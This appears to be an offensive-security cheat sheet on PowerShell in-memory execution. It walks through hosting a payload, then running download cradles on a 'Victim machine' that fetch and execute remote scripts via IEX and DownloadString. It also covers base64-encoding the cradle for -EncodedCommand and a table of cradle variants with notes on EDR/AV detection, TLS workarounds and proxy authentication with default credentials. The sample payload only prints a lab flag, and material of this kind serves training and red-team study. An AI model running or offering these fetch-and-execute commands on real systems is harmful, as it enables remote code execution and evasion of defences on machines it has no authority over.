# Powershell In-Memory Execution

## IEX and DownloadString

### 1) In your directory of choice to host your payload, create it there.

    echo 'Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VEhNezFuX20zbTByeV9jcjRkbDN9")))' > ~/payload.ps1

### 2) Host it on your HTTP server

    python3 -m http.server 8000

### 3) Run the download cradle

Victim machine

    IEX(New-Object Net.WebClient).DownloadString('http://CONNECTION_IP:8000/payload.ps1')

## EncodedCommand flag

### 1) Encode the download cradle command as a BPM-free UTF-16LE base64 string to match Windows

    python3 -c "import base64; print(base64.b64encode('IEX(New-Object Net.WebClient).DownloadString(\'http://CONNECTION_IP:8000/payload.ps1\')'.encode('utf-16-le')).decode())"

### 2) Run encoded command via Powershell

Victim machine

    powershell.exe -EncodedCommand BASE64

## Download Cradle Variations

| Variant       | Syntax                                                                                                                                                                                                 | Notes                                                                                                                                                |
|---------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| Classic       | `IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')`                                                                                                                      | Widely known and heavily monitored by EDR/AV. Uses `System.Net.WebClient` and executes the fetched script in-memory via `Invoke-Expression` (IEX).  |
| IWR IEX       | `IEX((IWR 'http://example.com/payload.ps1' -UseBasicParsing).Content)`                                                                                                                                | Uses `Invoke-WebRequest`; `-UseBasicParsing` is required on Server 2019/Core where IE is not initialized. `.Content` returns string for text bodies. |
| HTTPS fix     | `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX((New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1'))`                                  | Forces TLS 1.2 on older .NET where default is TLS 1.0/SSL3, avoiding handshake failures with modern HTTPS endpoints.                                |
| Proxy-aware   | `$c=New-Object Net.WebClient; $c.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX($c.DownloadString('http://example.com/payload.ps1'))` | Honors enterprise proxy settings and authenticates with default user creds; useful in environments with mandatory HTTP proxies.                      |

